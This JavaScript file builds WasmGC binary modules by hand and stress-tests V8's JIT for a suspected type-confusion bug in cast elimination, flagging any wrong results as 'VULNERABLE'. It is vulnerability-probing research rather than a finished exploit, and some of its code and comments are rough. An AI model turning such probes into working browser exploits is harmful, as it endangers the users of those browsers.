// WasmGC Type Confusion PoC Builder
// Builds valid WasmGC binary modules programmatically
// Target: V8 14.7.0 / Chrome 145

// === LEB128 Encoding Helpers ===
function leb128_u(value) {
  const result = [];
  do {
    let byte = value & 0x7f;
    value >>>= 7;
    if (value !== 0) byte |= 0x80;
    result.push(byte);
  } while (value !== 0);
  return result;
}

function leb128_s(value) {
  const result = [];
  let more = true;
  while (more) {
    let byte = value & 0x7f;
    value >>= 7;
    if ((value === 0 && (byte & 0x40) === 0) || (value === -1 && (byte & 0x40) !== 0)) {
      more = false;
    } else {
      byte |= 0x80;
    }
    result.push(byte);
  }
  return result;
}

function section(id, contents) {
  return [id, ...leb128_u(contents.length), ...contents];
}

function vec(items) {
  const flat = items.flat();
  return [...leb128_u(items.length), ...flat];
}

function string_bytes(str) {
  const encoded = new TextEncoder().encode(str);
  return [...leb128_u(encoded.length), ...encoded];
}

// === WasmGC Opcodes ===
const GC_PREFIX = 0xfb;
const STRUCT_NEW = 0x00;
const STRUCT_NEW_DEFAULT = 0x01;
const STRUCT_GET = 0x02;
const STRUCT_SET = 0x03;
const REF_CAST = 0x17;       // ref.cast non-null
const REF_CAST_NULL = 0x18;  // ref.cast nullable
const REF_TEST = 0x14;       // ref.test non-null
const REF_IS_NULL = 0xd1;    // not GC-prefixed
const REF_NULL = 0xd0;       // not GC-prefixed
const REF_AS_NON_NULL = 0xd4;

// Value types
const I32 = 0x7f;
const I64 = 0x7e;
const F32 = 0x7d;
const F64 = 0x7c;
const FUNCREF = 0x70;
const EXTERNREF = 0x6f;
const ANYREF = 0x6e;

// Composite types
const FUNC_TYPE = 0x60;
const STRUCT_TYPE = 0x5f;
const ARRAY_TYPE = 0x5e;

// Sub types
const SUB = 0x50;       // open sub
const SUB_FINAL = 0x4f; // final sub
const REC = 0x4e;       // rec group

// Control flow
const BLOCK = 0x02;
const LOOP = 0x03;
const IF = 0x04;
const ELSE = 0x05;
const END = 0x0b;
const BR = 0x0c;
const BR_IF = 0x0d;
const CALL = 0x10;
const CALL_INDIRECT = 0x11;

// === Module Builder ===
function buildModule1_StructFieldAccess() {
  // Module with two struct types and field access verification
  // Tests struct.new + struct.get code path in Turboshaft
  
  const types = [
    // Type 0: struct { mut i32, mut i32 }
    STRUCT_TYPE, 0x02, I32, 0x01, I32, 0x01,
    // Type 1: func () -> i32
    FUNC_TYPE, 0x00, 0x01, I32,
  ];
  
  const typeSection = section(0x01, [...leb128_u(2), ...types]);
  
  // Function section: 1 func of type 1
  const funcSection = section(0x03, [0x01, 0x01]);
  
  // Export section
  const exportSection = section(0x07, vec([
    [...string_bytes("get_field"), 0x00, ...leb128_u(0)],
  ]));
  
  // Code section
  const funcBody = [
    0x00, // 0 locals
    // struct.new $type0 with values 42, 99
    ...leb128_s(42),   // i32.const 42
    0x41, ...leb128_s(99),   // i32.const 99   
    GC_PREFIX, STRUCT_NEW, ...leb128_u(0),  // struct.new type 0
    GC_PREFIX, STRUCT_GET, ...leb128_u(0), ...leb128_u(0), // struct.get type 0, field 0
    END,
  ];
  // Fix: i32.const opcode
  const funcBody2 = [
    0x00, // 0 locals
    0x41, ...leb128_s(42),   // i32.const 42
    0x41, ...leb128_s(99),   // i32.const 99
    GC_PREFIX, STRUCT_NEW, ...leb128_u(0),  // struct.new type 0
    GC_PREFIX, STRUCT_GET, ...leb128_u(0), ...leb128_u(0), // struct.get type 0, field 0
    END,
  ];
  
  const codeSection = section(0x0a, vec([
    [...leb128_u(funcBody2.length), ...funcBody2],
  ]));
  
  const magic = [0x00, 0x61, 0x73, 0x6d];
  const version = [0x01, 0x00, 0x00, 0x00];
  
  return new Uint8Array([
    ...magic, ...version,
    ...typeSection,
    ...funcSection,
    ...exportSection,
    ...codeSection,
  ]);
}

function buildModule2_PhiStress() {
  // Module that creates struct refs in a loop with alternating branches
  // Targets ProcessPhi in WasmGCTypeAnalyzer
  
  const types = [
    // Type 0: struct { mut i32 }
    STRUCT_TYPE, 0x01, I32, 0x01,
    // Type 1: func (i32) -> i32
    FUNC_TYPE, 0x01, I32, 0x01, I32,
  ];
  
  const typeSection = section(0x01, [...leb128_u(2), ...types]);
  const funcSection = section(0x03, [0x01, 0x01]);
  const exportSection = section(0x07, vec([
    [...string_bytes("stress"), 0x00, ...leb128_u(0)],
  ]));
  
  // Code: loop that alternates between creating struct and null ref
  // Then accesses field of non-null refs
  const funcBody = [
    // locals: 1 ref null $type0, 1 i32 counter, 1 i32 sum
    0x03,  // 3 local declarations
    0x01, 0x63, 0x00,  // 1 local of type (ref null $type0) = 0x63 + type index
    0x01, I32,         // 1 local i32 (counter)
    0x01, I32,         // 1 local i32 (sum)
    
    // local.set 2 = 0 (counter)
    0x41, 0x00, 0x21, 0x02,
    // local.set 3 = 0 (sum)
    0x41, 0x00, 0x21, 0x03,
    
    // block $exit
    0x02, 0x40,
      // loop $iter
      0x03, 0x40,
        // if (i & 1) create struct, else null ref
        0x20, 0x02,          // local.get counter
        0x41, 0x01,          // i32.const 1
        0x71,                // i32.and
        0x04, 0x40,          // if void
          // struct.new $type0 with counter value
          0x20, 0x02,        // local.get counter
          GC_PREFIX, STRUCT_NEW, 0x00,  // struct.new type 0
          0x21, 0x01,        // local.set $ref
        0x05,                // else
          0xd0, 0x00,          // ref.null heap type 0
          0x21, 0x01,        // local.set $ref
        0x0b,                // end if
        
        // if (ref != null) sum += struct.get
        0x20, 0x01,          // local.get $ref
        REF_IS_NULL,         // ref.is_null
        0x45,                // i32.eqz
        0x04, 0x40,          // if void
          0x20, 0x03,        // local.get sum
          0x20, 0x01,        // local.get $ref
          REF_AS_NON_NULL,   // ref.as_non_null
          GC_PREFIX, STRUCT_GET, 0x00, 0x00,  // struct.get type 0, field 0
          0x6a,              // i32.add
          0x21, 0x03,        // local.set sum
        0x0b,                // end if
        
        // counter++
        0x20, 0x02,          // local.get counter
        0x41, 0x01,          // i32.const 1
        0x6a,                // i32.add
        0x21, 0x02,          // local.set counter
        
        // br_if $iter (counter < param0)
        0x20, 0x02,          // local.get counter
        0x20, 0x00,          // local.get param0
        0x48,                // i32.lt_s
        0x0d, 0x00,          // br_if 0 (loop)
      0x0b,                  // end loop
    0x0b,                    // end block
    
    0x20, 0x03,              // local.get sum
    END,
  ];
  
  const codeSection = section(0x0a, vec([
    [...leb128_u(funcBody.length), ...funcBody],
  ]));
  
  return new Uint8Array([
    0x00, 0x61, 0x73, 0x6d,
    0x01, 0x00, 0x00, 0x00,
    ...typeSection,
    ...funcSection,
    ...exportSection,
    ...codeSection,
  ]);
}

function buildModule3_CastElimination() {
  // Module with subtyping + cast — the key attack target
  // Tests if ref.cast is properly preserved after JIT
  
  // Use rec group for subtyping
  const typeContent = [
    0x01,       // 1 rec group
    REC,        // rec prefix
    0x03,       // 3 types in group
    
    // Type 0: struct { mut i32 } (base) - must be non-final for subtyping
    SUB, 0x00,                // sub (open), 0 supertypes
    STRUCT_TYPE, 0x01, I32, 0x01,
    
    // Type 1: struct { mut i32, mut f64 } extends type 0
    SUB_FINAL, 0x01, 0x00,    // sub final, 1 supertype: type 0
    STRUCT_TYPE, 0x02, I32, 0x01, F64, 0x01,
    
    // Type 2: func (i32) -> i32
    SUB_FINAL, 0x00,
    FUNC_TYPE, 0x01, I32, 0x01, I32,
  ];
  
  const typeSection = section(0x01, typeContent);
  const funcSection = section(0x03, [0x01, ...leb128_u(2)]);
  const exportSection = section(0x07, vec([
    [...string_bytes("test_cast"), 0x00, ...leb128_u(0)],
  ]));
  
  // Code: create child struct, upcast to parent ref, then downcast back
  // The downcast (ref.cast) is the operation the optimizer might eliminate
  const funcBody = [
    // 1 local: ref null $type0 (parent reference)
    0x01,
    0x01, 0x63, 0x00,  // ref null $type0
    
    // Create child struct (type 1) with values
    0x20, 0x00,          // local.get param (used as i32 field)
    0x44,                // f64.const
    ...new Uint8Array(new Float64Array([3.14]).buffer), // 3.14
    GC_PREFIX, STRUCT_NEW, ...leb128_u(1),  // struct.new type 1 (child)
    
    // Implicit upcast to parent (ref $type1 -> ref $type0 via subtyping)
    // Actually in WASM, we need explicit ref.cast or the type is already compatible
    // The child ref is structurally compatible with parent
    // Store as parent ref
    0x21, 0x01,          // local.set $ref (upcast happens implicitly)
    
    // Now downcast back: ref.cast to type 1 (child)
    0x20, 0x01,          // local.get $ref
    GC_PREFIX, REF_CAST, ...leb128_s(1),  // ref.cast heap type 1 (non-null)
    
    // Get field 0 (i32) from the casted ref
    GC_PREFIX, STRUCT_GET, ...leb128_u(1), ...leb128_u(0),
    
    END,
  ];
  
  const codeSection = section(0x0a, vec([
    [...leb128_u(funcBody.length), ...funcBody],
  ]));
  
  return new Uint8Array([
    0x00, 0x61, 0x73, 0x6d,
    0x01, 0x00, 0x00, 0x00,
    ...typeSection,
    ...funcSection,
    ...exportSection,
    ...codeSection,
  ]);
}

// === Test Runner ===
async function runTests() {
  const results = [];
  
  // Test 1: Basic struct field access
  console.log("=== Test 1: Struct Field Access ===");
  try {
    const bytes = buildModule1_StructFieldAccess();
    console.log(`Module size: ${bytes.length} bytes`);
    const mod = new WebAssembly.Module(bytes);
    const inst = await WebAssembly.instantiate(mod);
    const result = inst.exports.get_field();
    console.log(`struct.get field 0: ${result} (expected 42)`);
    console.log(result === 42 ? "SAFE" : "ANOMALY: wrong value!");
    
    // Hot loop to trigger JIT
    let allOk = true;
    for (let i = 0; i < 200000; i++) {
      if (inst.exports.get_field() !== 42) {
        console.log(`ANOMALY at iteration ${i}: ${inst.exports.get_field()}`);
        allOk = false;
        break;
      }
    }
    console.log(`200K iterations: ${allOk ? 'ALL CORRECT' : 'ANOMALY DETECTED'}`);
    results.push({ test: 'struct_field', ok: allOk });
  } catch (e) {
    console.log(`ERROR: ${e.message}`);
    results.push({ test: 'struct_field', ok: false, error: e.message });
  }
  
  // Test 2: Phi Stress (alternating struct/null in loop)
  console.log("\n=== Test 2: Phi Stress ===");
  try {
    const bytes = buildModule2_PhiStress();
    console.log(`Module size: ${bytes.length} bytes`);
    const mod = new WebAssembly.Module(bytes);
    const inst = await WebAssembly.instantiate(mod);
    
    // Expected: sum of odd numbers from 1 to n-1
    // For n=10: 1+3+5+7+9 = 25
    for (const n of [10, 100, 1000, 10000, 100000]) {
      const result = inst.exports.stress(n);
      // Calculate expected: sum of odd numbers 1,3,5,...,(n-1) or (n-2) 
      // Note: WASM uses i32, so we need to account for overflow
      let expected = 0;
      for (let i = 0; i < n; i++) {
        if (i & 1) expected = (expected + i) | 0; // i32 semantics
      }
      const ok = result === expected;
      console.log(`n=${n}: result=${result}, expected=${expected}, ${ok ? 'OK' : 'MISMATCH!'}`);
      if (!ok) {
        results.push({ test: `phi_stress_${n}`, ok: false });
      }
    }
    results.push({ test: 'phi_stress', ok: true });
  } catch (e) {
    console.log(`ERROR: ${e.message}`);
    results.push({ test: 'phi_stress', ok: false, error: e.message });
  }
  
  // Test 3: Cast Elimination (subtyping + downcast)
  console.log("\n=== Test 3: Cast Elimination ===");
  try {
    const bytes = buildModule3_CastElimination();
    console.log(`Module size: ${bytes.length} bytes`);
    const mod = new WebAssembly.Module(bytes);
    const inst = await WebAssembly.instantiate(mod);
    
    for (const val of [0, 1, 42, -1, 2147483647, -2147483648]) {
      const result = inst.exports.test_cast(val);
      console.log(`test_cast(${val}): ${result} (expected ${val})`);
      if (result !== val) {
        console.log(`ANOMALY: cast returned wrong value!`);
        results.push({ test: `cast_${val}`, ok: false });
      }
    }
    
    // Hot loop
    let anomalies = 0;
    for (let i = 0; i < 500000; i++) {
      if (inst.exports.test_cast(i) !== i) {
        anomalies++;
        if (anomalies <= 5) {
          console.log(`CAST ANOMALY at i=${i}: got ${inst.exports.test_cast(i)}`);
        }
      }
    }
    console.log(`500K cast iterations: ${anomalies} anomalies`);
    results.push({ test: 'cast_elimination', ok: anomalies === 0 });
  } catch (e) {
    console.log(`ERROR: ${e.message}`);
    results.push({ test: 'cast_elimination', ok: false, error: e.message });
  }
  
  // Summary
  console.log("\n=== SUMMARY ===");
  for (const r of results) {
    console.log(`${r.test}: ${r.ok ? 'SAFE' : 'VULNERABLE'}${r.error ? ' (' + r.error + ')' : ''}`);
  }
  
  const allSafe = results.every(r => r.ok);
  console.log(`\nOverall: ${allSafe ? 'ALL TESTS SAFE' : 'VULNERABILITIES DETECTED'}`);
}

runTests().catch(e => console.error('Fatal:', e.message));
